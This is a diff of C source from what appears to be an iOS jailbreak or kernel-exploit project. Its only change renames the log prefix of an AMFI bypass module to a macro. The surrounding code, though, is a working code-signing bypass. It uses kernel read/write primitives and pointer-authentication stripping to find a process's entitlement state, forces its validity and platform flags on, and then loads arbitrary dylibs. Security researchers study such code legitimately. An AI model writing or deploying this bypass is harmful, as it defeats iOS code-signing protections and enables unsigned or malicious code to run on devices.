@@ -34,26 +34,26 @@ static bool patch_state_flags(uint64_t state_kptr)
     bool changed = false;
 
     if (!flags->valid) {
-        printf("[AMFI] setting valid → 1\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] setting valid → 1\n");
         flags->valid = 1;
         changed = true;
     }
     if (!flags->is_cs_platform) {
-        printf("[AMFI] setting is_cs_platform → 1\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] setting is_cs_platform → 1\n");
         flags->is_cs_platform = 1;
         changed = true;
     }
     if (!flags->has_transmuted) {
-        printf("[AMFI] setting has_transmuted → 1\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] setting has_transmuted → 1\n");
         flags->has_transmuted = 1;
         changed = true;
     }
 
     if (changed) {
         kwritebuf(state_kptr, buf, sizeof(buf));
-        printf("[AMFI] state patched at 0x%llx\n", state_kptr);
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state patched at 0x%llx\n", state_kptr);
     } else {
-        printf("[AMFI] state already has desired flags\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state already has desired flags\n");
     }
     return true;
 }
@@ -72,7 +72,7 @@ static bool try_set_csflags(uint64_t proc)
     // Setting P_LX_64BIT (0x2000000) is sometimes used; we set flag=1
     // as a test to confirm we can write to this field.
     uint32_t p_flag = kread32(proc + off_proc_p_flag);
-    printf("[AMFI] proc p_flag = 0x%08x\n", p_flag);
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] proc p_flag = 0x%08x\n", p_flag);
 
     // Try to set a known flag to confirm write works
     // (We don't actually need to change p_flag for AMFI bypass)
@@ -86,19 +86,19 @@ static bool try_set_csflags(uint64_t proc)
 bool amfi_patch_proc(uint64_t proc)
 {
     if (!proc) {
-        printf("[AMFI] invalid proc\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid proc\n");
         return false;
     }
 
     uint64_t label = proc_get_cred_label(proc);
     if (!label) {
-        printf("[AMFI] failed to get cred label\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get cred label\n");
         return false;
     }
 
     uint64_t amfi_obj = amfi_cslot_get(label);
     if (!amfi_obj) {
-        printf("[AMFI] failed to get AMFI slot\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to get AMFI slot\n");
         return false;
     }
 
@@ -108,18 +108,18 @@ bool amfi_patch_proc(uint64_t proc)
 
     uint64_t state_kptr = xpaci((uint64_t)ent.state);
     if (!is_valid_kptr(state_kptr)) {
-        printf("[AMFI] invalid state pointer: 0x%llx\n", state_kptr);
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] invalid state pointer: 0x%llx\n", state_kptr);
         return false;
     }
 
-    printf("[AMFI] OSEntitlements at 0x%llx, state at 0x%llx\n",
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] OSEntitlements at 0x%llx, state at 0x%llx\n",
            amfi_obj, state_kptr);
 
     // Detect version
     uint8_t header[0x10];
     kreadbuf(state_kptr, header, sizeof(header));
     enum amfi_state_version ver = amfi_detect_version(header);
-    printf("[AMFI] state version: %s\n",
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] state version: %s\n",
            ver == AMFI_STATE_IOS17 ? "iOS 17" : "iOS 18");
 
     // Patch the flag bytes
@@ -135,26 +135,26 @@ bool amfi_patch_self(void)
 {
     uint64_t proc = proc_self();
     if (!proc) {
-        printf("[AMFI] failed to find self proc\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] failed to find self proc\n");
         return false;
     }
-    printf("[AMFI] self proc at 0x%llx\n", proc);
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] self proc at 0x%llx\n", proc);
     return amfi_patch_proc(proc);
 }
 
 void *amfi_try_load_dylib(const char *path)
 {
     if (!amfi_patch_self()) {
-        printf("[AMFI] patch failed, trying dlopen anyway\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] patch failed, trying dlopen anyway\n");
     }
 
-    printf("[AMFI] dlopen(\"%s\", RTLD_LAZY)...\n", path);
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] dlopen(\"%s\", RTLD_LAZY)...\n", path);
     void *handle = dlopen(path, RTLD_LAZY);
     if (handle) {
-        printf("[AMFI] dlopen succeeded: %p\n", handle);
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] dlopen succeeded: %p\n", handle);
         return handle;
     }
-    printf("[AMFI] dlopen failed: %s\n", dlerror());
+    printf("[" AMFI_BYPASS_EXPLOIT_NAME "] dlopen failed: %s\n", dlerror());
     return NULL;
 }
 
@@ -162,7 +162,7 @@ void amfi_dump_self(void)
 {
     uint64_t proc = proc_self();
     if (!proc) {
-        printf("[AMFI] no proc\n");
+        printf("[" AMFI_BYPASS_EXPLOIT_NAME "] no proc\n");
         return;
     }
     research_amfi(proc);
